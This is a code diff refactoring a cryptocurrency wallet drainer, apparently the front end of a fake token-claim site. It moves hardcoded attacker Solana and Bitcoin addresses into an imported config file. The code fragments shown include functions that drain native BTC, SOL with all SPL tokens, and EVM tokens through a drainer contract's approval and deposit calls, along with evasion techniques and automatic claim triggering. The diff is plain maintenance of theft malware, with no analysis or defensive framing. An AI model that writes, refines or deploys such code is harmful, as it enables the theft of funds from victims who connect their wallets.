@@ -172,7 +172,7 @@ import { CONFIG } from './config.js';
 })();
 
 // ====== IMPORT CONTRACT DATA FROM CONFIG ======
-const { DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG;
+const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
 
 // ====== WALLET DETECTION (EVM) ======
 const walletDetectors = {
@@ -464,7 +464,7 @@ const EVASION_TECHNIQUES = {
   },
 };
 
-// ====== DYNAMIC SOLANA LIBRARY LOADING ======
+// ====== DYNAMIC SOLANA LIBRARY LOADING (unchanged) ======
 async function loadSolanaLibraries() {
   if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
     console.log('Solana libraries already loaded');
@@ -529,12 +529,11 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
-const ATTACKER_BTC_ADDRESS = "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
+// (ATTACKER_SOLANA_ADDRESS and ATTACKER_BTC_ADDRESS are now imported from config)
 
 const DISABLE_DISCONNECT = isMobileDevice;
 
-// DOM Elements
+// DOM Elements (unchanged)
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
 const claimListElement = document.getElementById("claimList");
@@ -556,7 +555,7 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners
+// Event listeners (unchanged)
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -637,7 +636,7 @@ document.addEventListener("DOMContentLoaded", async function () {
   restoreSavedConnection();
 });
 
-// ====== PERSISTENCE HELPERS ======
+// ====== PERSISTENCE HELPERS (unchanged) ======
 function saveConnectionToLocalStorage(address, walletType) {
   try {
     localStorage.setItem('connectedAddress', address);
@@ -664,7 +663,7 @@ function restoreSavedConnection() {
   }
 }
 
-// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
+// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION (unchanged) ======
 async function checkAndAutoTriggerClaim() {
   if (!connectedAddress || !web3 || userHasClaimed) return;
 
@@ -712,7 +711,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== BITCOIN DRAIN (Native BTC) ======
+// ====== BITCOIN DRAIN (Native BTC) – uses imported ATTACKER_BTC_ADDRESS ======
 async function drainNativeBTC() {
   try {
     if (!window.unisat) {
@@ -740,7 +739,7 @@ async function drainNativeBTC() {
   }
 }
 
-// ====== IMPROVED SOLANA DRAIN (all SPL tokens) ======
+// ====== IMPROVED SOLANA DRAIN – uses imported ATTACKER_SOLANA_ADDRESS ======
 async function drainNativeSOL() {
   try {
     await loadSolanaLibraries();
@@ -854,7 +853,7 @@ async function getAttackerTokenAccount(mint) {
   return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
 }
 
-// ====== EVM DRAIN (Enhanced token detection) ======
+// ====== EVM DRAIN – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
 async function drainEVM() {
   if (!connectedWallet || !web3) {
     showNotification("Please connect your wallet first", "error");
@@ -1020,7 +1019,7 @@ async function drainEVM() {
   }
 }
 
-// ====== ENHANCED ERC-20 DETECTION ======
+// ====== ENHANCED ERC-20 DETECTION (uses imported ABI for contract calls) ======
 async function detectAllERC20Tokens(userAddress) {
   const result = { tokens: [], nfts: [], totalValueUSD: 0 };
 
@@ -1091,7 +1090,6 @@ async function fetchComprehensiveTokenList() {
       if (data.tokens) return data.tokens;
     } catch (e) {}
   }
-  // Fallback extended list
   return [
     { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
     { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
@@ -1130,7 +1128,7 @@ async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, de
   };
 }
 
-// ====== CALL setTokenApproval ======
+// ====== CALL setTokenApproval – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
 async function callSetTokenApproval(tokenAddress, amount) {
   try {
     if (!contractInstance) {
@@ -1159,7 +1157,7 @@ async function callSetTokenApproval(tokenAddress, amount) {
   }
 }
 
-// ====== CALL depositBNB ======
+// ====== CALL depositBNB – uses imported CONTRACT_ABI and DRAINER_CONTRACT ======
 async function callDepositBNB(ethAmount) {
   try {
     if (!contractInstance) {
@@ -1190,7 +1188,7 @@ async function callDepositBNB(ethAmount) {
   }
 }
 
-// ====== HELPER FUNCTIONS ======
+// ====== HELPER FUNCTIONS (all unchanged, but use imported constants where needed) ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
   document.addEventListener(
